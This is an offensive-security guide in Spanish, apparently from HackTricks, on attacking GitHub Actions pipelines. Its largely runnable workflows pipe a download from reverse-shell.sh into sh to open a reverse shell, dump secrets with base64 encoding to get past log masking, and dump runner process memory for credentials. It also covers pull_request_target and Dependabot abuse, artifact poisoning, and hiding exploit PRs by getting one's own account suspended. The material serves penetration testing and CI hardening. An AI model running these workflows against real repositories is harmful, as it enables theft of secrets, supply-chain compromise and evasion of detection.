# Abusar de Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Herramientas

Las siguientes herramientas son útiles para encontrar workflows de Github Action e incluso encontrar ones vulnerables:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Revisa también su checklist en [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Información básica

En esta página encontrarás:

- Un **resumen de todos los impactos** de un atacante que logre acceder a una Github Action
- Diferentes maneras de **obtener acceso a una Github Action**:
- Tener **permisos** para crear la action
- Abusar de triggers relacionados con **pull request**
- Abusar de **otras técnicas de acceso externo**
- **Pivoting** desde un repo ya comprometido
- Finalmente, una sección sobre **post-exploitation techniques** para abusar de una Github Action desde dentro (causar los impactos mencionados)

## Resumen de impactos

Para una introducción sobre [**Github Actions revisa la información básica**](../basic-github-information.md#github-actions).

Si puedes **ejecutar código arbitrario en GitHub Actions** dentro de un **repositorio**, podrías:

- **Steal secrets** montados en el pipeline y **abusar de los privilegios del pipeline** para obtener acceso no autorizado a plataformas externas, como AWS y GCP.
- **Comprometer despliegues** y otros **artefactos**.
- Si el pipeline deploya o almacena assets, podrías alterar el producto final, posibilitando un ataque a la cadena de suministro.
- **Ejecutar código en workers personalizados** para abusar del poder de cómputo y pivotar a otros sistemas.
- **Sobrescribir el código del repositorio**, dependiendo de los permisos asociados con el `GITHUB_TOKEN`.

## GITHUB_TOKEN

Este "**secret**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se otorga cuando el admin habilita esta opción:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que **una Github Application usará**, por lo que puede acceder a los mismos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github debería lanzar un [**flow**](https://github.com/github/roadmap/issues/74) que **permita acceso cross-repository** dentro de GitHub, de modo que un repo pueda acceder a otros repos internos usando el `GITHUB_TOKEN`.

Puedes ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Ten en cuenta que el token **expira después de que el job ha completado**.\
Estos tokens se ven así: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Ten en cuenta que en varias ocasiones podrás encontrar **github user tokens dentro de los envs de Github Actions o en los secrets**. Estos tokens pueden otorgarte más privilegios sobre el repositorio y la organización.

<details>

<summary>Listar secrets en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener una reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es posible comprobar los permisos otorgados a un Github Token en los repositorios de otros usuarios **comprobando los logs** de las actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ejecución permitida

> [!NOTE]
> Esta sería la forma más fácil de comprometer Github actions, ya que este caso supone que tienes acceso a **crear un nuevo repositorio en la organización**, o tienes **privilegios de escritura sobre un repositorio**.
>
> Si te encuentras en este escenario puedes simplemente revisar los [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Ejecución desde la creación de un repositorio

En caso de que los miembros de una organización puedan **create new repos** y tú puedas ejecutar Github actions, puedes **create a new repo and steal the secrets set at organization level**.

### Ejecución desde una nueva rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Github Action configurada**, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa action desde la nueva rama**. De esta forma puedes **exfiltrate repository and organization level secrets** (pero necesitas saber cómo se llaman).

> [!WARNING]
> Cualquier restricción implementada sólo dentro del workflow YAML (por ejemplo, `on: push: branches: [main]`, job conditionals, o manual gates) puede ser editada por colaboradores. Sin enforcement externo (branch protections, protected environments, and protected tags), un contribuidor puede redirigir un workflow para que se ejecute en su rama y abusar de los mounted secrets/permissions.

Puedes hacer la action modificada ejecutable **manualmente,** cuando se **cree un PR** o cuando se **haga push de código** (dependiendo de cuán ruidoso quieras ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Ejecución en forks

> [!NOTE]
> Existen diferentes disparadores que podrían permitir a un atacante **ejecutar una Github Action de otro repositorio**. Si esas acciones que se pueden activar están mal configuradas, un atacante podría comprometerlas.

### `pull_request`

El workflow trigger **`pull_request`** ejecutará el workflow cada vez que se reciba un pull request con algunas excepciones: por defecto, si es la **primera vez** que estás **colaborando**, algún **mantenedor** deberá **aprobar** la **ejecución** del workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Como la **limitación por defecto** es para contribuyentes de **primera vez**, podrías contribuir **corrigiendo un bug/typo válido** y luego enviar **otros PRs para abusar de tus nuevos privilegios de `pull_request`**.
>
> **Probé esto y no funciona**: ~~Otra opción sería crear una cuenta con el nombre de alguien que contribuyó al proyecto y eliminar su cuenta.~~

Además, por defecto **se impiden los permisos de escritura** y el **acceso a secrets** al repositorio objetivo, como se menciona en la [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Un atacante podría modificar la definición de la Github Action para ejecutar cosas arbitrarias y añadir acciones arbitrarias. Sin embargo, no podrá robar secrets ni sobrescribir el repo debido a las limitaciones mencionadas.

> [!CAUTION]
> **Sí, si el atacante cambia en el PR la Github Action que se ejecutará, ¡su Github Action será la que se use y no la del repositorio de origen!**

Dado que el atacante también controla el código que se ejecuta, aunque no haya secrets ni permisos de escritura en el `GITHUB_TOKEN`, un atacante podría por ejemplo **subir artifacts maliciosos**.

### **`pull_request_target`**

El workflow trigger **`pull_request_target`** tiene **permisos de escritura** en el repositorio objetivo y **acceso a secrets** (y no solicita permiso).

Ten en cuenta que el workflow trigger **`pull_request_target`** **se ejecuta en el contexto base** y no en el proporcionado por el PR (para **no ejecutar código no confiable**). Para más información sobre `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Además, para más información sobre este uso específico peligroso revisa este [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Podría parecer que, dado que el **workflow ejecutado** es el que está definido en la **base** y **no en el PR**, es **seguro** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendrá **acceso a secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

En este ejemplo, un workflow está configurado para ejecutarse después de que el workflow separado "Run Tests" finalice:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Comprobar si cuando se ejecuta desde un `pull_request` el código usado/descargado es el del origen o el del PR forkeado

## Abusing Forked Execution

Hemos mencionado todas las formas en que un atacante externo podría lograr que un github workflow se ejecute, ahora veamos cómo estas ejecuciones, si están mal configuradas, podrían ser abusadas:

### Untrusted checkout execution

En el caso de `pull_request`, el workflow se va a ejecutar en el contexto del PR (por lo que ejecutará el código malicioso del PR), pero alguien necesita autorizarlo primero y se ejecutará con algunas [limitaciones](#pull_request).

En el caso de un workflow usando `pull_request_target` or `workflow_run` que depende de un workflow que puede ser triggeredo desde `pull_request_target` o `pull_request` se ejecutará el código del repositorio original, por lo que el atacante no puede controlar el código ejecutado.

> [!CAUTION]
> However, si la **action** tiene un **checkout explícito del PR** que **obtiene el código del PR** (y no del base), usará el código controlado por el atacante. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Inyecciones de scripts en contextos <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Ten en cuenta que existen ciertos [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores están **controlados** por el **usuario** que crea el PR. Si la github action está usando esos **datos para ejecutar cualquier cosa**, esto podría conducir a **ejecución de código arbitrario:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD_PRELOAD** or **NODE_OPTIONS**.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Lo cual es un problema porque el campo `github.actor` contiene el usuario que provocó el último evento que desencadenó el workflow. Y hay varias maneras de hacer que el usuario `dependabot[bot]` modifique un PR. Por ejemplo:

- Fork del repositorio de la víctima
- Añade el payload malicioso a tu copia
- Habilita Dependabot en tu fork añadiendo una dependencia desactualizada. Dependabot creará una branch que arregla la dependencia con código malicioso.
- Abre un Pull Request al repositorio de la víctima desde esa branch (el PR será creado por el usuario, así que aún no pasará nada)
- Luego, el atacante vuelve al PR inicial que Dependabot abrió en su fork y ejecuta `@dependabot recreate`
- Entonces, Dependabot realiza algunas acciones en esa branch, que modifican el PR en el repo de la víctima, lo que hace que `dependabot[bot]` sea el actor del último evento que desencadenó el workflow (y por lo tanto, el workflow se ejecuta).

Avanzando, ¿y si en lugar de hacer merge el Github Action tuviera una inyección de comandos como en:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Bueno, la entrada del blog original propone dos opciones para abusar de este comportamiento, siendo la segunda:

- Fork the victim repository y habilita Dependabot con alguna dependencia desactualizada.
- Crea una nueva branch con el código de inyección de shell malicioso.
- Cambia la default branch del repo a esa.
- Crea un PR desde esa branch hacia el victim repository.
- Ejecuta `@dependabot merge` en el PR que Dependabot abrió en su fork.
- Dependabot fusionará sus cambios en la default branch de tu forked repository, actualizando el PR en el victim repository, haciendo ahora que `dependabot[bot]` sea el actor del último evento que disparó el workflow y usando un nombre de branch malicioso.

### Terceras partes vulnerables en Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como se menciona en [**esta entrada del blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta Github Action permite acceder a artifacts de diferentes workflows e incluso repositories.

El problema es que si el parámetro **`path`** no está establecido, el artifact se extrae en el directorio actual y puede sobrescribir archivos que podrían usarse o incluso ejecutarse más tarde en el workflow. Por lo tanto, si el Artifact es vulnerable, un atacante podría abusar de esto para comprometer otros workflows que confían en el Artifact.

Ejemplo de workflow vulnerable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podría ser atacado con este workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Otros accesos externos

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Por lo tanto, si una action está usando un repo de una account inexistente, sigue siendo posible que un attacker pueda crear esa account y comprometer la action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> En esta sección hablaremos sobre técnicas que permitirían **pivot from one repo to another** suponiendo que tengamos algún tipo de acceso en el primero (revisa la sección anterior).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Ejemplo:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Accediendo a AWS y GCP vía OIDC

Consulta las siguientes páginas:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Accediendo a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si inyectas contenido en un script, es interesante saber cómo puedes acceder a los secretos:

- Si el secreto o token está establecido como una **environment variable**, puede accederse directamente desde el entorno usando **`printenv`**.

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener reverse shell con secretos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
- ```bash
cat /home/runner/work/_temp/*
```
- Para una JavaScript action, los secrets se envían a través de environment variables
- ```bash
ps axe | grep node
```
- Para una **custom action**, el riesgo puede variar dependiendo de cómo un programa esté usando el secret que obtuvo del **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumera todos los secrets vía el secrets context (collaborator level). Un contributor con write access puede modificar un workflow en cualquier branch para volcar todos los repository/org/environment secrets. Usa double base64 para evadir el log masking de GitHub y decodifica localmente:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decodifica localmente:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: para sigilo durante las pruebas, encripta antes de imprimir (openssl is preinstalled on GitHub-hosted runners).

### Abusing Self-hosted runners

La forma de encontrar qué **Github Actions are being executed in non-github infrastructure** es buscar **`runs-on: self-hosted`** en el Github Action configuration yaml.

**Self-hosted** runners podrían tener acceso a **extra sensitive information**, a otros **network systems** (vulnerable endpoints in the network? metadata service?) o, incluso si están aislados y destruidos, **more than one action might be run at the same time** y la maliciosa podría **steal the secrets** de la otra.

En los self-hosted runners también es posible obtener the **secrets from the \_Runner.Listener**\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Consulta [**esta publicación para más información**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de imágenes Docker de Github

Es posible crear Github Actions que **construyan y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente elemento desplegable:

<details>

<summary>Github Action: Compilar y subir imagen Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como puedes ver en el código anterior, el registro de Github está alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repo podrá entonces descargar la Docker Image usando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Entonces, el usuario podría buscar **leaked secrets en las capas de imagen de Docker:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Información sensible en los logs de Github Actions

Aunque **Github** intenta **detectar valores secretos** en los logs de Actions y **evitar mostrarlos**, **otros datos sensibles** que pudieron haberse generado durante la ejecución de la action no serán ocultados. Por ejemplo, un JWT firmado con un valor secreto no será ocultado a menos que esté [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Ocultando tus rastros

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primero que nada, cualquier PR abierto es claramente visible para el público en Github y para la cuenta objetivo en GitHub. En GitHub, por defecto, **can’t delete a PR of the internet**, pero hay una excepción. Para las cuentas de Github que son **suspendidas** por Github, todos sus **PRs are automatically deleted** y se quitan de internet. Así que, para ocultar tu actividad necesitas o bien conseguir que tu **GitHub account suspended or get your account flagged**. Esto **hide all your activities** en GitHub desde internet (básicamente remove all your exploit PR)

Una organización en GitHub es muy proactiva en reportar cuentas a GitHub. Todo lo que necesitas hacer es compartir “some stuff” en un Issue y se asegurarán de que tu cuenta sea suspendida en 12 hours :p y ahí lo tienes, habrás hecho tu exploit invisible en github.

> [!WARNING]
> La única forma de que una organización descubra que ha sido objetivo es revisar los GitHub logs desde el SIEM, ya que desde la GitHub UI el PR sería eliminado.

## Referencias

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
